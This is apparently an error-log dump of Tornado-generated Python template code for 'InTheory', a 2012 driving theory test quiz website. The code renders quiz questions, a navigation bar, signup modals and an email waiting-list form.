336      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
337      _append(_tmp)  # home.html:21 (via base.html:76)
338      _append('","options": ["')  # home.html:21 (via base.html:76)
339      _tmp = kwargs["questions"][8].options[0]  # home.html:21 (via base.html:76)
340      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
341      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
342      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
343      _append(_tmp)  # home.html:21 (via base.html:76)
344      _append('", "')  # home.html:21 (via base.html:76)
345      _tmp = kwargs["questions"][8].options[1]  # home.html:21 (via base.html:76)
346      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
347      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
348      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
349      _append(_tmp)  # home.html:21 (via base.html:76)
350      _append('", "')  # home.html:21 (via base.html:76)
351      _tmp = kwargs["questions"][8].options[2]  # home.html:21 (via base.html:76)
352      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
353      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
354      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
355      _append(_tmp)  # home.html:21 (via base.html:76)
356      _append('", "')  # home.html:21 (via base.html:76)
357      _tmp = kwargs["questions"][8].options[3]  # home.html:21 (via base.html:76)
358      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
359      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
360      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
361      _append(_tmp)  # home.html:21 (via base.html:76)
362      _append('"],"answer": ')  # home.html:21 (via base.html:76)
363      _tmp = kwargs["questions"][8].answer  # home.html:21 (via base.html:76)
364      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
365      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
366      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
367      _append(_tmp)  # home.html:21 (via base.html:76)
368      _append('},{ "question":"')  # home.html:21 (via base.html:76)
369      _tmp = kwargs["questions"][9].question  # home.html:21 (via base.html:76)
370      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
371      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
372      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
373      _append(_tmp)  # home.html:21 (via base.html:76)
374      _append('","options": ["')  # home.html:21 (via base.html:76)
375      _tmp = kwargs["questions"][9].options[0]  # home.html:21 (via base.html:76)
376      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
377      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
378      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
379      _append(_tmp)  # home.html:21 (via base.html:76)
380      _append('", "')  # home.html:21 (via base.html:76)
381      _tmp = kwargs["questions"][9].options[1]  # home.html:21 (via base.html:76)
382      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
383      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
384      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
385      _append(_tmp)  # home.html:21 (via base.html:76)
386      _append('", "')  # home.html:21 (via base.html:76)
387      _tmp = kwargs["questions"][9].options[2]  # home.html:21 (via base.html:76)
388      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
389      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
390      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
391      _append(_tmp)  # home.html:21 (via base.html:76)
392      _append('", "')  # home.html:21 (via base.html:76)
393      _tmp = kwargs["questions"][9].options[3]  # home.html:21 (via base.html:76)
394      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
395      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
396      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
397      _append(_tmp)  # home.html:21 (via base.html:76)
398      _append('"],"answer": ')  # home.html:21 (via base.html:76)
399      _tmp = kwargs["questions"][9].answer  # home.html:21 (via base.html:76)
400      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
401      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
402      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
403      _append(_tmp)  # home.html:21 (via base.html:76)
404      _append('}]\'>\n</div>\n<div id="answers" data-answers=\'[]\'></div>\n<div id="mini-quiz-box" class="undimmed">\n')  # home.html:25 (via base.html:76)
405      question = kwargs['questions'][0]  # home.html:25 (via base.html:76)
406      _append('\n<h4> ')  # home.html:26 (via base.html:76)
407      _tmp = question.question  # home.html:26 (via base.html:76)
408      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:26 (via base.html:76)
409      else: _tmp = _utf8(str(_tmp))  # home.html:26 (via base.html:76)
410      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:26 (via base.html:76)
411      _append(_tmp)  # home.html:26 (via base.html:76)
412      _append('</h4>\n<ul remaining-answers=')  # home.html:27 (via base.html:76)
413      _tmp = len(question.answer)  # home.html:27 (via base.html:76)
414      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:27 (via base.html:76)
415      else: _tmp = _utf8(str(_tmp))  # home.html:27 (via base.html:76)
416      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:27 (via base.html:76)
417      _append(_tmp)  # home.html:27 (via base.html:76)
418      _append(' class="nav nav-pills nav-stacked">\n<li><a class="choice" ind="0"><span class="badge badge-info">A</span> ')  # home.html:28 (via base.html:76)
419      _tmp = question.options[0]  # home.html:28 (via base.html:76)
420      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:28 (via base.html:76)
421      else: _tmp = _utf8(str(_tmp))  # home.html:28 (via base.html:76)
422      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:28 (via base.html:76)
423      _append(_tmp)  # home.html:28 (via base.html:76)
424      _append('</a></li>\n<li><a class="choice" ind="1"><span class="badge badge-info">B</span> ')  # home.html:29 (via base.html:76)
425      _tmp = question.options[1]  # home.html:29 (via base.html:76)
426      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:29 (via base.html:76)
427      else: _tmp = _utf8(str(_tmp))  # home.html:29 (via base.html:76)
428      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:29 (via base.html:76)
429      _append(_tmp)  # home.html:29 (via base.html:76)
430      _append('</a></li>\n<li><a class="choice" ind="2"><span class="badge badge-info">C</span> ')  # home.html:30 (via base.html:76)
431      _tmp = question.options[2]  # home.html:30 (via base.html:76)
432      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:30 (via base.html:76)
433      else: _tmp = _utf8(str(_tmp))  # home.html:30 (via base.html:76)
434      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:30 (via base.html:76)
435      _append(_tmp)  # home.html:30 (via base.html:76)
436      _append('</a></li>\n<li><a class="choice" ind="3"><span class="badge badge-info">D</span> ')  # home.html:31 (via base.html:76)
437      _tmp = question.options[3]  # home.html:31 (via base.html:76)
438      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:31 (via base.html:76)
439      else: _tmp = _utf8(str(_tmp))  # home.html:31 (via base.html:76)
440      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:31 (via base.html:76)
441      _append(_tmp)  # home.html:31 (via base.html:76)
442      _append('</a></li>\n</ul>\n<a id="next" class="btn btn-success btn-mini disabled">Next Question</a>\n</div>\n</div>\n</div>\n</div>\n</div>\n<div class="row">\n<div class="span10">\n</div>\n<div class="span5 offset5">\n</br></br>\n<blockquote>\n<p>\n<h2><div class="funkytext"><font color="#ffffff">"')  # home.html:47 (via base.html:76)
443      _tmp = kwargs['tweet']  # home.html:47 (via base.html:76)
444      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:47 (via base.html:76)
445      else: _tmp = _utf8(str(_tmp))  # home.html:47 (via base.html:76)
446      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:47 (via base.html:76)
447      _append(_tmp)  # home.html:47 (via base.html:76)
448      _append('"</h2>\n<div class="funkytext">- Dave Mason, London</font></div>\n</p>\n</blockquote>\n</div>\n</div>\n</div> <!-- /container -->\n<div id="dim">\n</div>\n')  # home.html:57 (via base.html:76)
449      _append('\n')  # base.html:80
450      _tmp = xsrf_form_html()  # base.html:80
451      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:80
452      else: _tmp = _utf8(str(_tmp))  # base.html:80
453      _append(_tmp)  # base.html:80
454      _append('\n')  # base.html:81
455      _append('\n<script src="')  # base.html:82 (via base.html:81)
456      _tmp = static_url('js/libs/jquery-1.7.2.min.js')  # base.html:82 (via base.html:81)
457      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:82 (via base.html:81)
458      else: _tmp = _utf8(str(_tmp))  # base.html:82 (via base.html:81)
459      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:82 (via base.html:81)
460      _append(_tmp)  # base.html:82 (via base.html:81)
461      _append('"></script>\n<script src="')  # base.html:83 (via base.html:81)
462      _tmp = static_url('js/libs/blurb.min.js')  # base.html:83 (via base.html:81)
463      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:83 (via base.html:81)
464      else: _tmp = _utf8(str(_tmp))  # base.html:83 (via base.html:81)
465      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:83 (via base.html:81)
466      _append(_tmp)  # base.html:83 (via base.html:81)
467      _append('"></script>\n<script src="')  # base.html:84 (via base.html:81)
468      _tmp = static_url('js/IT.js')  # base.html:84 (via base.html:81)
469      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:84 (via base.html:81)
470      else: _tmp = _utf8(str(_tmp))  # base.html:84 (via base.html:81)
471      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:84 (via base.html:81)
472      _append(_tmp)  # base.html:84 (via base.html:81)
473      _append('"></script>\n<script type="text/javascript" src="http://twitter.github.com/bootstrap/assets/js/bootstrap-dropdown.js"></script>\n<script type="text/javascript" src="http://twitter.github.com/bootstrap/assets/js/bootstrap-button.js"></script>\n<script type="text/javascript" src="http://twitter.github.com/bootstrap/assets/js/bootstrap-modal.js"></script>\n')  # base.html:88 (via base.html:81)
474      _append('\n')  # base.html:90
475      for js in kwargs['js_deps']:  # base.html:90
476          _append('\n<script src="')  # base.html:91
477          _tmp = static_url(js)  # base.html:91
478          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:91
479          else: _tmp = _utf8(str(_tmp))  # base.html:91
480          _tmp = _utf8(xhtml_escape(_tmp))  # base.html:91
481          _append(_tmp)  # base.html:91
482          _append('"></script>\n')  # base.html:92
483      _append('\n')  # base.html:94
484      _append('\n<script id="signup-template" type="text/x-jquery-tmpl">\n<div id="windowTitleDialog" class="modal hide fade">\n<div class="modal-header">\n<a class="close">&times;</a>\n<h3>You scored ${score} out of 10!</h3>\n</div>\n<div class="modal-body">\n<p>You still need a little practice, but don\'t worry we\'re here to help you pass. Sign-up today to get started...</p>\n<a href="/login"><center><img src="')  # home.html:68 (via base.html:94)
485      _tmp = static_url('imgs/facebook.png')  # home.html:68 (via base.html:94)
486      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:68 (via base.html:94)
487      else: _tmp = _utf8(str(_tmp))  # home.html:68 (via base.html:94)
488      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:68 (via base.html:94)
489      _append(_tmp)  # home.html:68 (via base.html:94)
490      _append('" alt="some_text"/></a>\n<img src="')  # home.html:69 (via base.html:94)
491      _tmp = static_url('imgs/twitter.png')  # home.html:69 (via base.html:94)
492      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:69 (via base.html:94)
493      else: _tmp = _utf8(str(_tmp))  # home.html:69 (via base.html:94)
494      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:69 (via base.html:94)
495      _append(_tmp)  # home.html:69 (via base.html:94)
496      _append('" alt="some_text"/>\n<img src="')  # home.html:70 (via base.html:94)
497      _tmp = static_url('imgs/google.png')  # home.html:70 (via base.html:94)
498      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:70 (via base.html:94)
499      else: _tmp = _utf8(str(_tmp))  # home.html:70 (via base.html:94)
500      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:70 (via base.html:94)
501      _append(_tmp)  # home.html:70 (via base.html:94)
502      _append('" alt="some_text"/></center>\n<center><a href="h">Or click here to sign-up directly</a></center>\n</div>\n<div class="modal-footer">\n<ul class="pager">\n<li class="previous"><a href="#">Sign in to InTheory</a></li>\n<li class="next"><a href="#">Forgot username or password?</a></li>\n</ul>\n</div>\n</div>\n</script>\n<script id="show-arrow-template" type="text/x-jquery-tmpl">\n<div class="arrow-container">\n<img src="')  # home.html:84 (via base.html:94)
503      _tmp = static_url('imgs/arrow.png')  # home.html:84 (via base.html:94)
504      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:84 (via base.html:94)
505      else: _tmp = _utf8(str(_tmp))  # home.html:84 (via base.html:94)
506      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:84 (via base.html:94)
507      _append(_tmp)  # home.html:84 (via base.html:94)
508      _append('"/>\n</div>\n</script>\n<script id="email-template" type="text/x-jquery-tmpl">\n<div id="windowTitleDialog" class="modal hide fade">\n<div class="modal-header">\n<a class="close">&times;</a>\n<h3>You scored ${score} out of 10!</h3>\n</div>\n<div class="modal-body">\n<center>\n<p>Leave your email and we\'ll let you know when we launch!</p>\n<form method="post" class="af-form-wrapper" action="http://www.aweber.com/scripts/addlead.pl" >\n<div style="display: none;">\n<input type="hidden" name="meta_web_form_id" value="677441365" />\n<input type="hidden" name="meta_split_id" value="" />\n<input type="hidden" name="listname" value="intheory" />\n<input type="hidden" name="redirect" value="http://www.aweber.com/thankyou-coi.htm?m=video" id="redirect_b3be9783c304109a8d9d9ca013e7b651" />\n<input type="hidden" name="meta_adtracking" value="Waiting_List_/_Splash" />\n<input type="hidden" name="meta_message" value="1" />\n<input type="hidden" name="meta_required" value="name,email" />\n<input type="hidden" name="meta_tooltip" value="" />\n</div>\n<div id="af-form-677441365" class="af-form"><div id="af-body-677441365" class="af-body af-standards">\n<div class="af-element">\n<div class="af-textWrap"></br>\n<input id="awf_field-39151245" type="text" name="name" class="text" placeholder="Enter Your Name" tabindex="500" />\n</div>\n<div class="af-clear"></div></div>\n<div class="af-element">\n<div class="af-textWrap"><input class="text" id="awf_field-39151246" type="text" name="email" placeholder="Enter Your Email" tabindex="501" />\n</div><div class="af-clear"></div>\n</div>\n<input name="submit" class="btn btn-primaryw" type="submit" value="Submit" tabindex="502" />\n</br>\n<a href="/login">or connect with Facebook</a>\n</div>\n</br></br>\n<div class="af-element privacyPolicy" style="text-align: center"><p>We respect your <a title="Privacy Policy" href="http://www.aweber.com/permission.htm" target="_blank">email privacy</a></p>\n<div class="af-clear"></div>\n</div>\n</div>\n</div>\n<div style="display: none;"><img src="http://forms.aweber.com/form/displays.htm?id=bOzsLCyMzGys" alt="" /></div>\n</form>\n</center>\n<script type="text/javascript">\n<!--\n(function() {\nvar IE = /*@cc_on!@*/false;\nif (!IE) { return; }\nif (document.compatMode && document.compatMode == \'BackCompat\') {\nif (document.getElementById("af-form-677441365")) {\ndocument.getElementById("af-form-677441365").className = \'af-form af-quirksMode\';\n}\nif (document.getElementById("af-body-677441365")) {\ndocument.getElementById("af-body-677441365").className = "af-body inline af-quirksMode";\n}\nif (document.getElementById("af-header-677441365")) {\ndocument.getElementById("af-header-677441365").className = "af-header af-quirksMode";\n}\nif (document.getElementById("af-footer-677441365")) {\ndocument.getElementById("af-footer-677441365").className = "af-footer af-quirksMode";\n}\n}\n})();\n-->\n</script>\n</div>\n</div>\n</script>\n')  # home.html:158 (via base.html:94)
509      _append('\n<div class="container">\n<div class="footer"><font color="#FFFFFF" size="2px"> <p class="alignleft">InTheory Media Limited \xc2\xa9 2012</p>\n<p class="alignright">About Us | Terms & Conditions | Privacy Policy | Support </p></font></br>\n</div>\n</div>\n</body>\n</html>\n')  # base.html:106
510      return _utf8('').join(_buffer)  # base.html:0
ERROR:root:home.html code:
  1  def _execute():  # base.html:0
  2      _buffer = []  # base.html:0
  3      _append = _buffer.append  # base.html:0
  4      _append('<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">\n<!--[if lt IE 7 ]> <html lang="en" class="no-js ie6"> <![endif]-->\n<!--[if IE 7 ]> <html lang="en" class="no-js ie7"> <![endif]-->\n<!--[if IE 8 ]> <html lang="en" class="no-js ie8"> <![endif]-->\n<!--[if IE 9 ]> <html lang="en" class="no-js ie9"> <![endif]-->\n<!--[if (gt IE 9)|!(IE)]><!--> <html lang="en" class="no-js"> <!--<![endif]-->\n<head xmlns="http://www.w3.org/1999/xhtml" xmlns:fb="http://www.facebook.com/2008/fbml">\n<meta charset="utf-8">\n<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">\n<meta name="author" content="intheory">\n<meta name="description" content="Intheory 2012">\n<meta property="og:image" content="http://www.petrominpng.com.pg/images/logo_big.png" />\n<meta name="viewport" content="width=920, initial-scale=auto">\n<meta property="og:type" content="website" />\n<meta property="og:title" content="Intheory 2012" />\n<meta property="og:site_name" content="Intheory 2012" />\n<title>\n')  # base.html:19
  5      _append('\nInTheory | Pass Your Theory Test. Guaranteed.\n')  # base.html:21 (via base.html:19)
  6      _append('\n</title>\n<link href="../static/css/bootstrap.css" rel="stylesheet">\n<link href="../static/css/bootstrap-responsive.css" rel="stylesheet">\n<link rel="stylesheet" href="')  # base.html:25
  7      _tmp = static_url('css/base.css')  # base.html:25
  8      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:25
  9      else: _tmp = _utf8(str(_tmp))  # base.html:25
 10      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:25
 11      _append(_tmp)  # base.html:25
 12      _append('" />\n')  # base.html:26
 13      for css in kwargs['css_deps']:  # base.html:26
 14          _append('\n<link href="')  # base.html:27
 15          _tmp = static_url(css)  # base.html:27
 16          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:27
 17          else: _tmp = _utf8(str(_tmp))  # base.html:27
 18          _tmp = _utf8(xhtml_escape(_tmp))  # base.html:27
 19          _append(_tmp)  # base.html:27
 20          _append('" rel="stylesheet">\n')  # base.html:28
 21      _append('\n<style type="text/css">\nhtml{\nbackground-image: url(/static/imgs/background.jpg);\nbackground-repeat: no-repeat;\n}\nbody {\npadding-top: 60px;\npadding-bottom: 40px;\n}\n</style>\n</head>\n<body >\n')  # base.html:44
 22      _append('\n<div class="navbar navbar-fixed-top">\n<div class="navbar-inner">\n<div class="container">\n<a class="btn btn-navbar" data-toggle="collapse" data-target=".nav-collapse">\n<span class="icon-bar"></span>\n<span class="icon-bar"></span>\n<span class="icon-bar"></span>\n</a>\n<a class="brand" href="/"> <img src="')  # base.html:53 (via base.html:44)
 23      _tmp = static_url('imgs/logo.png')  # base.html:53 (via base.html:44)
 24      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:53 (via base.html:44)
 25      else: _tmp = _utf8(str(_tmp))  # base.html:53 (via base.html:44)
 26      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:53 (via base.html:44)
 27      _append(_tmp)  # base.html:53 (via base.html:44)
 28      _append('"></a>\n<div class="pull-right">\n')  # base.html:55 (via base.html:44)
 29      if not current_user:  # base.html:55 (via base.html:44)
 30          _append('\n<a href="/login"><button type="submit" class="btn btn-success">Sign in</button></a>\n')  # base.html:57 (via base.html:44)
 31      else:  # base.html:57 (via base.html:44)
 32          _append('\n<ul class="nav nav-pills">\n')  # base.html:59 (via base.html:44)
 33          if current_user['moderator']:  # base.html:59 (via base.html:44)
 34              _append('\n<li id="admin-nav"><a href="/admin">Admin</a></li>\n')  # base.html:61 (via base.html:44)
 35          _append('\n<li class="active"><a href="/learn/main">Learn</a></li>\n<li id="mock-test-nav"><a href="/test/new">Mock Test</a></li>\n<li><a href="#">Book Test</a></li>\n<li><a href="/logout">Logout</a></li>\n<li>|</li>\n</ul>\n<a class="brand1" href="/dashboard"> <img src="')  # base.html:68 (via base.html:44)
 36          _tmp = static_url('imgs/user.png')  # base.html:68 (via base.html:44)
 37          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:68 (via base.html:44)
 38          else: _tmp = _utf8(str(_tmp))  # base.html:68 (via base.html:44)
 39          _tmp = _utf8(xhtml_escape(_tmp))  # base.html:68 (via base.html:44)
 40          _append(_tmp)  # base.html:68 (via base.html:44)
 41          _append('"></a>\n')  # base.html:69 (via base.html:44)
 42      _append('\n</div>\n</div>\n</div>\n</div>\n')  # base.html:74 (via base.html:44)
 43      _append('\n')  # base.html:76
 44      _append('\n<div class="container">\n<div class="hero-unit">\n<div class="hero-unit1">\n<div class="row-fluid">\n<div class="columnA pull-left">\n<h2>Pass your theory test.<br>Guaranteed.</h2>\n<ul>\n<li>The simplest and fastest way to pass your test.</li>\n<li>Use cool new learning techniques to help you remember the details.</li>\n<li>Don\'t pass first time? Get your money back.</li>\n</ul></br>\n<p><a id="get-started-btn" class="btn btn-block btn-success btn-large">Get Started Today</a></p>\n</div>\n<div class="columnB pull-right">\n</br>\n<div id="questions" data-questions=\n\'[{ "question":"')  # home.html:21 (via base.html:76)
 45      _tmp = kwargs["questions"][0].question  # home.html:21 (via base.html:76)
 46      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
 47      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
 48      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
 49      _append(_tmp)  # home.html:21 (via base.html:76)
 50      _append('","options": ["')  # home.html:21 (via base.html:76)
 51      _tmp = kwargs["questions"][0].options[0]  # home.html:21 (via base.html:76)
 52      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
 53      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
 54      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
 55      _append(_tmp)  # home.html:21 (via base.html:76)
 56      _append('", "')  # home.html:21 (via base.html:76)
 57      _tmp = kwargs["questions"][0].options[1]  # home.html:21 (via base.html:76)
 58      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
 59      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
 60      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
 61      _append(_tmp)  # home.html:21 (via base.html:76)
 62      _append('", "')  # home.html:21 (via base.html:76)
 63      _tmp = kwargs["questions"][0].options[2]  # home.html:21 (via base.html:76)
 64      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
 65      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
 66      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
 67      _append(_tmp)  # home.html:21 (via base.html:76)
 68      _append('", "')  # home.html:21 (via base.html:76)
 69      _tmp = kwargs["questions"][0].options[3]  # home.html:21 (via base.html:76)
 70      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
 71      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
 72      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
 73      _append(_tmp)  # home.html:21 (via base.html:76)
 74      _append('"],"answer": ')  # home.html:21 (via base.html:76)
 75      _tmp = kwargs["questions"][0].answer  # home.html:21 (via base.html:76)
 76      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
 77      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
 78      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
 79      _append(_tmp)  # home.html:21 (via base.html:76)
 80      _append('},{ "question":"')  # home.html:21 (via base.html:76)
 81      _tmp = kwargs["questions"][1].question  # home.html:21 (via base.html:76)
 82      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
 83      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
 84      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
 85      _append(_tmp)  # home.html:21 (via base.html:76)
 86      _append('","options": ["')  # home.html:21 (via base.html:76)
 87      _tmp = kwargs["questions"][1].options[0]  # home.html:21 (via base.html:76)
 88      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
 89      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
 90      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
 91      _append(_tmp)  # home.html:21 (via base.html:76)
 92      _append('", "')  # home.html:21 (via base.html:76)
 93      _tmp = kwargs["questions"][1].options[1]  # home.html:21 (via base.html:76)
 94      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
 95      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
 96      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
 97      _append(_tmp)  # home.html:21 (via base.html:76)
 98      _append('", "')  # home.html:21 (via base.html:76)
 99      _tmp = kwargs["questions"][1].options[2]  # home.html:21 (via base.html:76)
100      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
101      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
102      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
103      _append(_tmp)  # home.html:21 (via base.html:76)
104      _append('", "')  # home.html:21 (via base.html:76)
105      _tmp = kwargs["questions"][1].options[3]  # home.html:21 (via base.html:76)
106      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
107      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
108      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
109      _append(_tmp)  # home.html:21 (via base.html:76)
110      _append('"],"answer": ')  # home.html:21 (via base.html:76)
111      _tmp = kwargs["questions"][1].answer  # home.html:21 (via base.html:76)
112      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
113      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
114      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
115      _append(_tmp)  # home.html:21 (via base.html:76)
116      _append('}, { "question":"')  # home.html:21 (via base.html:76)
117      _tmp = kwargs["questions"][2].question  # home.html:21 (via base.html:76)
118      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
119      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
120      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
121      _append(_tmp)  # home.html:21 (via base.html:76)
122      _append('","options": ["')  # home.html:21 (via base.html:76)
123      _tmp = kwargs["questions"][2].options[0]  # home.html:21 (via base.html:76)
124      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
125      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
126      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
127      _append(_tmp)  # home.html:21 (via base.html:76)
128      _append('", "')  # home.html:21 (via base.html:76)
129      _tmp = kwargs["questions"][2].options[1]  # home.html:21 (via base.html:76)
130      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
131      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
132      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
133      _append(_tmp)  # home.html:21 (via base.html:76)
134      _append('", "')  # home.html:21 (via base.html:76)
135      _tmp = kwargs["questions"][2].options[2]  # home.html:21 (via base.html:76)
136      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
137      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
138      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
139      _append(_tmp)  # home.html:21 (via base.html:76)
140      _append('", "')  # home.html:21 (via base.html:76)
141      _tmp = kwargs["questions"][2].options[3]  # home.html:21 (via base.html:76)
142      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
143      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
144      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
145      _append(_tmp)  # home.html:21 (via base.html:76)
